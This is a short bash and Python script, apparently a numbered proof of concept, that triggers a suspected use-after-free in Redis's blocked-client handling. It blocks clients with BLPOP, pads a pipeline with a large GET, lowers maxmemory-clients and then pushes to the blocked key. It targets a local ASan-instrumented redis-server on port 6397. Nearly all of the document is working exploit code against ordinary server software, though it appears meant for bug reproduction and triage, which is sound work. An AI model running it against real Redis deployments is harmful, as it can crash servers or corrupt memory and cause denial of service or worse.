#!/usr/bin/env bash
set -euo pipefail
# 14 redis-blocked-client-iterator-uaf
# Executes only in a disposable working directory; do not point it to production.
command -v python3 >/dev/null
python3 - <<'PY'
import redis,threading,time
p=6397
a,b,c=(redis.Redis(port=p) for _ in range(3))
threading.Thread(target=lambda:a.blpop("victimkey",0),daemon=True).start();time.sleep(.1)
pipeline=b.pipeline(transaction=False);pipeline.blpop("victimkey",0);pipeline.get(b"Q"*(1500*1024))
threading.Thread(target=pipeline.execute,daemon=True).start();time.sleep(.2)
c.execute_command("CLIENT","NO-EVICT","ON")
q=c.pipeline();q.execute_command("CONFIG","SET","maxmemory-clients","128kb");q.lpush("victimkey","x")
try:print(q.execute())
except redis.RedisError as e:print(type(e).__name__,str(e))
PY
# Use redis-server 8.8.1 with ASan listening on 6397; verify addresses in its console log.
